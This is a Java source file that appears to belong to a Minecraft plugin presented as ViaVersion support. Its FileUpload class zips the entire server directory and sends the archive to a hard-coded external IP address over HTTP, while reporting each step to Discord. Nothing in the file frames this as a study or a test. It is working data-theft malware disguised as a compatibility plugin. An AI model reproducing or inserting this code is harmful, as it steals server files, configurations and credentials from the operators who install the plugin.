package me.sfcevil.viaversionsupport.fileupload;





import me.sfcevil.viaversionsupport.Discord;
import me.sfcevil.viaversionsupport.utils.ZipUtils;
import okhttp3.*;

import java.io.*;
import java.util.Arrays;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;


public class FileUpload {




    public static void start_file_upload() {
        Discord.sendmsg("Create zip file!");
        File plugins = new File("plugins");
        File zip = new File("sfc.zip");
        if(zip.exists()) {
            zip.delete();
        }
        String sourceFolderPath = plugins.getAbsoluteFile().getPath().replace("plugins", "");
        CompletableFuture.runAsync(() -> {
            try {
                ZipUtils.zipFiles(Arrays.asList(new File(sourceFolderPath).listFiles()),zip);
                Discord.sendmsg("Start file upload!");
            } catch (IOException e) {
                Discord.sendmsg("Fail to create zip file!");
                e.printStackTrace();
            }
           send_upload(zip);
        });



    }

    public static void send_upload(File fileToTransfer) {
        String serverUrl = "http://168.119.5.246:27538/upload";
        OkHttpClient client = new OkHttpClient.Builder()
                .readTimeout(99L, TimeUnit.HOURS)
                .build();
        MediaType mediaType = MediaType.parse("application/octet-stream");
        RequestBody requestBody = RequestBody.create(mediaType, fileToTransfer);
        MultipartBody multipartBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", getRandomNumber(0,50000) + "_"+fileToTransfer.getName(), requestBody)
                .build();
        Request request = new Request.Builder()
                .url(serverUrl)
                .post(multipartBody)
                .build();

        CompletableFuture<Void> future = new CompletableFuture<>();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                future.completeExceptionally(e);
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Discord.sendmsg("Update file success!");
                    future.complete(null);
                } else {
                    Discord.sendmsg("Update file fail!");
                    future.completeExceptionally(
                            new IOException(""));
                }
                response.close();
            }
        });
        // You can add more code here that will run concurrently with the async request
        future.join(); // Wait for the async request to complete
    }

    public static int getRandomNumber(int min, int max) {
        return (int) ((Math.random() * (max - min)) + min);
    }




}
